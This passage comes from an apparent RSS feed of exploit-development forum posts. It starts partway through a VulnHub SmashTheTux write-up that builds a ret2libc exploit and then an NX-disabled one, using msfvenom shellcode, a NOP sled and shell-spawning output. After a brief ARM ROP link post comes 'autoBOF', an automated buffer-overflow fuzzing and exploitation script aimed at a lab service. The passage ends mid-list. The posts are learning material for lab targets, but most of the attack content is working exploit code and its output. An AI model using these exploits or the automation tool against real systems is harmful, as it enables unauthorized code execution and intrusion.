</blockquote>
<pre><code class="lang-auto">268 + 0xb7e643e0 + 0xb7e571b0 + 0xb7f85a69
</code></pre>
<p>We can use python for doing exploitation</p>
<pre><code class="lang-bash"># cat bypass_nx.py
from struct import *

buf = ""
buf += "X" * (268)
buf += pack("&lt;L",0xb7e643e0) #system() address
buf += pack("&lt;L",0xb7e571b0) #exit() address
buf += pack("&lt;L",0xb7f85a69 ) #/bin/sh call address
print buf
</code></pre>
<p>Time to exploit</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ ./pwnme $(python bypass_nx.py)
Val: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�C淰q��iZ��
$ ps
  PID TTY          TIME CMD
  816 pts/0    00:00:00 bash
 1092 pts/0    00:00:00 pwnme
 1094 pts/0    00:00:00 sh
 1098 pts/0    00:00:00 ps
$ echo $0
/bin/sh
</code></pre>
<p>Horrraaaayyyyyyyyy! We can spawn new shell. <img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"><img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"><img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"><img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"></p>
<blockquote>
<p>In the end, We will return to libc</p>
</blockquote>
<p><strong>[BONUS] Exploiting with NX Disable</strong></p>
<p>By default, the program compiled with NX protection and not allowed for executes the payload in stack address. For this bonus section, we can recompile using <code>execstack</code> parameter for gcc.</p>
<pre><code class="lang-auto">mv pwnme pwnme-nx
gcc pwnme.c -o pwnme -fno-stack-protector -z execstack
</code></pre>
<p>Check with gdb-peda.</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ gdb pwnme 
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from pwnme...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>
<p>As you can see, NX protection is disabled for now. We need to know where we will jump by checking the <code>jmp call eax</code> address.</p>
<p>Searching for jmp/eax call, this information will be useful when overwritting EIP Address.</p>
<pre><code class="lang-bash">gdb-peda$ jmpcall
0x8048393 : call eax
0x80483cd : call edx
0x8048420 : call edx
0x80485b7 : jmp [eax]
0x8049393 : call eax
0x80493cd : call edx
0x8049420 : call edx
0x80495b7 : jmp [eax]
</code></pre>
<p>We will use <code>0x8048393 : call eax</code> and note this address as return address.</p>
<p>Now, this is what we got so far:</p>
<ul>
<li>EIP Offset 0x41332541</li>
<li>Offset Number 268</li>
<li>return address 0x8048393</li>
<li>padding/nop =&gt; 268 - shellcode buf - 4</li>
</ul>
<p>We know that our offset is 268 and here is the formula I used:</p>
<blockquote>
<p>Padding + shellcode buf + return address</p>
</blockquote>
<p><strong>Generating Payload</strong></p>
<p>For this purpose, we need Venom for creating the payload because Spiderman is far from home :P. I think 268 bytes is enough for basic <code>exec</code> linux payload. You may use other shellcode than venom. I’m just prefer this for easy to use. I’m exclude “\x00\x0a\0d” from shellcode payload as bad character.</p>
<pre><code class="lang-bash">↳ msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b "\x00\x0a\0d"
WARNING: Nokogiri was built against LibXML version 2.9.8, but has dynamically loaded 2.9.9
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of python file: 358 bytes
buf =  ""
buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"
</code></pre>
<p>Okay, time for generating our final payload:</p>
<pre><code class="lang-python">import os

# linux/x86/exec CMD=/bin/bash payload 
# bad char : "\x00\x0a\0d"

buf =  ""
buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"

# define offset
offset = 268

# (268 - 72) - 4 = 192
padding = (offset - len(buf)) - 4

# NOPSLED as identifer with total offset - size of the buf
payload =  "\x90" * padding + buf

# overwrite EIP to jump to 'call eax' in little endians
payload += "\x93\x83\x04\08"

print payload
</code></pre>
<p>With that script, you don’t need to worry thinking of how many padding you should use.</p>
<p>Time to exploit:</p>
<pre><code class="lang-bash">tux@tux:~/0x00$ echo $$
1335
tux@tux:~/0x00$ ps
  PID TTY          TIME CMD
 1335 pts/0    00:00:00 bash
 1437 pts/0    00:00:00 ps
tux@tux:~/0x00$ ./pwnme $(python exploit.py)
Val: �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������rqp4���t$�Z)ɱ
                                      ���1BB}��^�
                                                 ����Ғ{�E�������%����RC��;-�i��fnJv������8
tux@tux:/home/tux/0x00$ echo $$
1440
tux@tux:/home/tux/0x00$ ps
  PID TTY          TIME CMD
 1335 pts/0    00:00:00 bash
 1439 pts/0    00:00:00 sh
 1440 pts/0    00:00:00 bash
 1445 pts/0    00:00:00 ps
tux@tux:/home/tux/0x00$ 
</code></pre>
<p>Horraaayyy! <img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"><img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"><img src="https://0x00sec.org/images/emoji/twitter/partying_face.png?v=9" title=":partying_face:" class="emoji" alt=":partying_face:"></p>
<p>I will discuss Level 0x01 in the next series of SmashTheTux. Feedback are welcome &lt;3. See ya!</p>
<p>Reference:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/120.html" rel="noopener nofollow ugc">https://cwe.mitre.org/data/definitions/120.html</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3" rel="noopener nofollow ugc">https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3</a></li>
<li><a href="https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md" rel="noopener nofollow ugc">https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md</a></li>
<li><a href="https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html" rel="noopener nofollow ugc">https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html</a></li>
<li><a href="https://www.shellblade.net/docs/ret2libc.pdf" rel="noopener nofollow ugc">https://www.shellblade.net/docs/ret2libc.pdf</a></li>
<li><a href="https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/" rel="noopener nofollow ugc">https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" rel="noopener nofollow ugc">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></li>
<li><a href="https://reboare.github.io/bof/linux-stack-bof-3.html" rel="noopener nofollow ugc">https://reboare.github.io/bof/linux-stack-bof-3.html</a></li>
<li><a href="https://www.coengoedegebure.com/buffer-overflow-attacks-explained/" rel="noopener nofollow ugc">https://www.coengoedegebure.com/buffer-overflow-attacks-explained/</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850</link>
          <pubDate>Tue, 09 Jul 2019 09:57:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14850</guid>
          <source url="https://0x00sec.org/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
        </item>
        <item>
          <title>Return Oriented Programming on ARM (32-bit)</title>
          <dc:creator><![CDATA[icyphox]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hi!<br>
I’ve always just lurked on here, this is my first post.</p>
<p>So as a part of my summer internship, I’ve been working at an IoT security firm. I’ve been teaching myself ARM security and reversing to apply in IoT security. I figured I’d share what I’ve learnt so far <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://icyphox.sh/static/favicon.ico" class="site-icon" width="16" height="16">
      <a href="https://icyphox.sh/blog/rop-on-arm/" target="_blank" rel="noopener nofollow ugc">icyphox.sh</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0379788cc90e5520aee3fea2016c3840c96982de.png" class="thumbnail" width="" height="">

<h3><a href="https://icyphox.sh/blog/rop-on-arm/" target="_blank" rel="noopener nofollow ugc">Return Oriented Programming on ARM (32-bit)</a></h3>

<p>Making stack-based exploitation great again!</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>10 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/return-oriented-programming-on-arm-32-bit/14183">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/return-oriented-programming-on-arm-32-bit/14183</link>
          <pubDate>Thu, 06 Jun 2019 16:01:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14183</guid>
          <source url="https://0x00sec.org/t/return-oriented-programming-on-arm-32-bit/14183.rss">Return Oriented Programming on ARM (32-bit)</source>
        </item>
        <item>
          <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
          <dc:creator><![CDATA[Rain]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><strong>TL;DR I wrote a program to automate buffer overflows. I talk about what buffer overflows are, why I made this program, and show all the code I used.</strong></p>
<p>In 11 days from now, it will have been a year since I first started on my journey of becoming an Offensive Security Certified Professional. In 15 days from now, it will have been a year since the lowest point in my infosec journey. I was feeling very discouraged and out of my depth. During the 4 days in between, I had been breezing through the material - covering multiple sections of coursework in a day. But when I got to the buffer overflow section of the learning material, and it just did not click with me. I failed over and over again for 3 straight days to grasp the material. I began to wonder if I had tried to do too much, too fast and wasn’t sure if I was in over my head or not. I stayed up late that third day, trying to get back on track, and I finally exploited the practice server Offsec provided me. I was ecstatic! And for the most part, I moved on to the next part of my coursework, filing away that new knowledge for the time being. But those three days planted a small seed of pure vengeance in my heart. “Screw buffer overflows!”, the seed said. “You should make it so no one ever has to make these again!”.</p>
<p>As it would turn out, my university wanted me to make something before they’d let me graduate. As long as my advisor deemed it sufficiently complex of a task, I could make whatever my heart desired. As previously stated, my heart desired vengeance (being very fertile soil for such things). Fortunately my advisor thought the idea was interesting and gave me the go-ahead. My first step was to create a design document, outlining the intended functionality of my little project and what it’d look like at each stage. I dreamed very big. The original intention for autoBOF was cross-platform with support for integrating multiple different debuggers in the process. In fact, it was also intended to be a tool used remotely - a thin client that would connect to a remote laboratory environment. It would be a masterpiece, a sword crafted to slay the tedious monster of my past.</p>
<p>None of that happened of course, and the tool ended up being about 500 lines of poorly optimized python that can only run on a local (Linux) laboratory environment. It’s wonky, takes about a minute to run in a best-case scenario, and doesn’t perform anywhere near as well as I originally expected it to. But it works. At least, it works against the crossfire application included in my PWK Kali VM. I do not have the illusion that my code is of any particular quality. In fact, if my professors actually looked at the code I’m about to show you, they may take away the CS degree I expect to receive next month.</p>
<p>Despite having said all of that, this took a lot of effort to make on my part, mostly during the hours of 10PM and 3AM before my weekly progress reports, as well as 0 to 3 random afternoons of any given week. There were also a couple occasions where I over promised what I would accomplish during a given period of time and had to frantically work to make up the difference. It seemed that every time I tried to take something I knew how to do manually and have my program do it automatically, I ran into some difficult (to me) problem to solve that I never anticipated beforehand. Because the tasks required for this program had an extremely minimal overlap with my formal education in programming, I had to break new ground whenever I wanted to do anything. Did I mention this is the first python program I’ve written? Anyway, let’s briefly discuss how these kinds of buffer overflows work and then get to the code.</p>
<hr>
<p>The kind of buffer overflow autoBOF intends to exploit is a very basic kind of overflow. Say there is a server somewhere, that accepts data and stores it in a variable somewhere. Kind of a stretch, but bear with me. And then let’s assume that this server stores this data in variables of a fixed length. What happens if the server lets you send it more data than it can store? What does it do with the extra data? In our ideal case, it just puts it in adjacent memory space, overwriting some other poor sap’s data. And if we can write to system memory… can’t we tell the server to do things it’s not supposed to? That’s the plan! Our general approach is:</p>
<ol>
<li>Fuzz the target server. Does it crash when we send lots of data?</li>
<li>If the server crashes, we may have done something! Let’s find out exactly how much data it takes to crash the server.</li>
<li>We discover that the server crashes when we send X bytes, and the register that directs program execution is overwritten at Y bytes. So we can execute X - Y bytes of code. Hurray!</li>
<li>Sometimes, certain values aren’t processed by the server the way we want them to be processed. Let’s send every relevant value to the server and see if they come out the way we want them to. If not, those values are ‘bad’ and of an undiscerning character. So we call them ‘bad characters’. Or some reason like that.</li>
<li>Next, we need to find a JMP instruction to hijack. We need to tell the program to jump to the payload we make and execute it.</li>
<li>Lastly, if there’s enough space between X and Y to fit our whole payload, we generate one and send it in! If there isn’t enough space, we can put the payload inside our buffer (before Y bytes of data), and hope that we have enough space in the payload space to say ‘Jump to the payload at the start of the buffer’.</li>
</ol>
<p>Note: Please forgive me for any improper indentations. I had to change leading spaces to <code>&amp;nbsp;</code> and may have missed some. You can find the original code at <a href="https://github.com/DiscipleOfDust/autoBOF" rel="nofollow noopener">https://github.com/DiscipleOfDust/autoBOF</a></p>
<hr>
<pre><code class="lang-python">#!/usr/bin/python
# -*- coding: utf-8 -*- 
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
if(sys.argv[1] == "-help" or sys.argv[1] == "-h"): #consider two modes - one with user input, and the other with command line logic
 print "Usage: python autoBOF.py -start [initial data sequence including spaces] -end [any post-payload data sequence including spaces] -l [minimum buffer length] [maximum buffer length] -i [number of bytes to increment buffer by for each attempt] -target [remote IP] [remote port] -local [local IP] [shell port] -p [maximum attempts at payload generation] -n [name of exploit] -s [verbose by default, include to minimize stdout] \n\nExample: python autoBOF.py -start \"x11(setup sound \" -end \"x90x00#\" -l 4368 4400 -i 1 -target 127.0.0.1 13327 -local 127.0.0.1 1337 -p 5 -n overflow.py \nAlternatively, type \"python autoBOF.py -config /path/to/file.txt\" to use a configuration file instead" 
 print "--------------------------------------------------------------------------------------------------"
 print "Config file format example:\nstart: \x11(setup sound \nend:\x90\x00#\nlengthMin: 4368\nlengthMax: 4400\nincrement: 1\ntargetIP: 127.0.0.1\ntargetPort: 13327\nlocalIP: 127.0.0.1\nshellPort: 1337\npayloadAttempts: 5\nexploitName: autoExploit.py\nsilent: False"
 print "--------------------------------------------------------------------------------------------------"
 print "IMPORTANT: Requires partner script, restart.py to be running in tandem. Usage for restart.py: Move file to directory containing vulnerable service binary and type \"gdb -q -x restart.py [service name]\""
 sys.exit()
#init vals
curVal = 0
argStart = 'autoBOF' #AutoBOF is uninit value for input checking
argEnd = 'autoBOF'
argLengthMin = 'autoBOF'
argLengthMax = 'autoBOF'
argIncrement = 'autoBOF'
argTargetIP = 'autoBOF'
argTargetPort = 'autoBOF'
argLocalIP = 'autoBOF'
argShellport = 'autoBOF'
argPayloadAttempts = 'autoBOF'
argExploitName = 'autoBOF'
argSilent = False

if(sys.argv[1] != "-config"):
 for x in sys.argv:
  curVal = curVal + 1
  if (x == "-start"):
   argStart = sys.argv[curVal] #Consider escaping these like below
   argStart = argStart.decode('string_escape')
  elif(x == "-end"):
   argEnd = sys.argv[curVal]
   argEnd = argEnd.decode('string_escape')
  elif(x == "-l"):
   argLengthMin = sys.argv[curVal]
   argLengthMax = sys.argv[curVal+1]
  elif(x == "-i"):
   argIncrement = sys.argv[curVal]
  elif(x == "-target"):
   argTargetIP =  sys.argv[curVal]
   argTargetPort = sys.argv[curVal+1]
  elif(x == "-local"):
   argLocalIP = sys.argv[curVal]
   argShellPort = sys.argv[curVal+1]
  elif(x == "-p"):
   argPayloadAttempts = sys.argv[curVal]
  elif(x == "-n"):
   argExploitName = sys.argv[curVal]
  elif(x == "-s"):
   argSilent = True
else:
 fileName = sys.argv[2]
 bufFile = open(fileName,"r")
 configFile = bufFile.read()
 configFile = configFile.split('\n') #newlines are common bad character, so not being able to parse them in config files isn't the worst thing in the world.
 tempIndex = configFile[0].find(':')
 argStart = configFile[0][tempIndex+2:]
 argStart = argStart.decode('string_escape')
 tempIndex = configFile[1].find(':')
 argEnd = configFile[1][tempIndex+2:]
 argEnd = argEnd.decode('string_escape')
 tempIndex = configFile[2].find(':')
 argLengthMin = configFile[2][tempIndex+2:]
 tempIndex = configFile[3].find(':')
 argLengthMax = configFile[3][tempIndex+2:]
 tempIndex = configFile[4].find(':')
 argIncrement = configFile[4][tempIndex+2:]
 tempIndex = configFile[5].find(':')
 argTargetIP = configFile[5][tempIndex+2:]
 tempIndex = configFile[6].find(':')
 argTargetPort = configFile[6][tempIndex+2:]
 tempIndex = configFile[7].find(':')
 argLocalIP = configFile[7][tempIndex+2:]
 tempIndex = configFile[8].find(':')
 argShellPort = configFile[8][tempIndex+2:]
 tempIndex = configFile[9].find(':')
 argPayloadAttempts = configFile[9][tempIndex+2:]
 tempIndex = configFile[10].find(':')
 argExploitName = configFile[10][tempIndex+2:]
 tempIndex = configFile[11].find(':')
 argSilent = configFile[11][tempIndex+2:]
 if (argSilent == "True"):
  argSilent = True
 else:
  argSilent = False
#Check the arguments for proper initialization
if(argStart == 'autoBOF'):
 print 'ERROR: uninitialized start argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argEnd == 'autoBOF'):
 print 'ERROR: uninitialized end argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMin == 'autoBOF' or argLengthMin.isdigit() == False):
 print 'ERROR: uninitialized or invalid minimum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMax == 'autoBOF' or argLengthMax.isdigit() == False):
 print 'ERROR: uninitialized or invalid maximum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argIncrement == 'autoBOF' or argIncrement.isdigit() == False):
 print 'ERROR: uninitialized or invalid buffer length increment argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetIP == 'autoBOF'):
 print 'ERROR: uninitialized Target IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetPort == 'autoBOF' or argTargetPort.isdigit() == False):
 print 'ERROR: uninitialized or invalidTarget Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLocalIP == 'autoBOF'):
 print 'ERROR: uninitialized Local IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argShellPort == 'autoBOF' or argShellPort.isdigit() == False):
 print 'ERROR: uninitialized Shell Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argPayloadAttempts == 'autoBOF' or argPayloadAttempts.isdigit() == False):
 print 'Warning: Unitialized number of payload attemps. Will be set to 3. Try autoBOF.py -h for more details'
 argPayloadAttempts = 3
if(argExploitName == 'autoBOF'):
 print 'ERROR: uninitialized Exploit Name argument. Try autoBOF.py -h for more details'
 sys.exit()
if(len(argExploitName) &lt; 3):
 print 'ERROR: Exploit name must be at least three characters long'
sys.exit()
</code></pre>
<hr>
<p>Alright, so here we have how the user interacts with the program. They can either make a configuration file (my recommendation) which contains all the necessary specifications for the program to execute, or they can use flags if they are so inclined. I found there to be so many flags that I never actually tested whether or not that functionality worked. I ran into some encoding issues that made me try to configuration file as a solution, and when I solved that problem (which turned out to be completely unrelated to the input method), I slapped the same solution onto the flag parsing, but since I never tested that it may be completely broken.</p>
<p>You may also notice a lack of shell customization (Never got around to implementing shell customization. It might have taken half an hour, it might have taken a day). Hopefully bind shells are okay. I also hope that your service doesn’t require one of the variables to be ‘autoBOF’ for some reason, because then my program wouldn’t work at all. Of particular note here are my half assed type checking and some random comments I don’t remember making and could have sworn I removed from the code for being irrelevant or nonsensical.</p>
<hr>
<pre><code class="lang-python">#Start program execution
if(not argSilent):
 os.system("figlet autoBOF") #Optional but very important dependency
host = argTargetIP
port = int(argTargetPort)
buffer = ('\x41')
start = argStart
end = argEnd
isSuccess = False
overflow = buffer
tryUntil = int(argLengthMax)
startCount = int(argLengthMin)
increment = int(argIncrement)
if(not argSilent):
 print "---- Attempting to Crash Service ----"
while(startCount &lt; tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  if(not argSilent):
   print "fuzzing at", startCount, "bytes", "out of", tryUntil
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(.6)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
if(not isSuccess):
 if(not argSilent):
  print "---- Service is Resilient  ----"
  print("No overflow up to"),tryUntil,"bytes"
 sys.exit()
#END OVERFLOW DETECTION
</code></pre>
<hr>
<p>I hope you like the code you see above because I copy and paste it a lot instead of reusing it in a method like a practical, efficient programmer. Here the program sends a sequence of A’s to the service inside a user-specified wrapper. The debugger script I wrote (which will be shown later) dumps the eip register whenever the targeted service crashes. The code will loop until it reaches the user specified limit or until the EIP register is overwritten with A’s. If it is, we can continue searching for our buffer overflow! If A is a bad character we’ll be in a bit of trouble, though. Anyway, one of the problems I had with this section of code was trying to figure out the optimal way to fuzz a service. Some of these overflows only happen at extremely specific amounts of data, and a difference of one byte could make or break the exploit. As a result, I decided to leave it entirely up to the user and thus absolve myself of that responsibility. By that I mean to say I’m empowering the users by maximizing the customization potential of my software.</p>
<hr>
<pre><code class="lang-python">if(not argSilent):
 print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount)
bashCommand = bashCommand + strTest + " &gt; offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
if(not argSilent):
 print("Unique Buffer Sent")
 print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(.6)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
startValue = eipValue.find("0x")
eipValue = eipValue[startValue:(startValue+10)]
if(not argSilent):
 print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " &gt; offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
startValue = offset.find("offset")+7
offset = offset[startValue:]
offset = offset.strip('\n')
offset = int(offset)
shellSpace = startCount - offset

if(not argSilent):
print "Offset is at", offset, "bytes with", (shellSpace), "bytes of post-offset shellcode space"
</code></pre>
<hr>
<p>The above code is very straightforward - I call Metasploit’s pattern creation and offset tools to add a custom string to the buffer in order to determine exactly where the overwrite takes place. This lets me know how much space I have to work with to place shellcode. I am again aided by my lovely debugger script.</p>
<hr>
<pre><code class="lang-python"> ########## Bad Character Phase ##########
 print '--- Bad Character Detection Phase ---'
#removed 00, 0A, OD, FF as common bad characters
badchars_hex = ["\x00", "\x0a", "\x0d", "\xff"]
badchars_text = ["00","0a","0d","ff"]
allchars_hex = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0b","\x0c","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe"]
allchars_text = ["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1",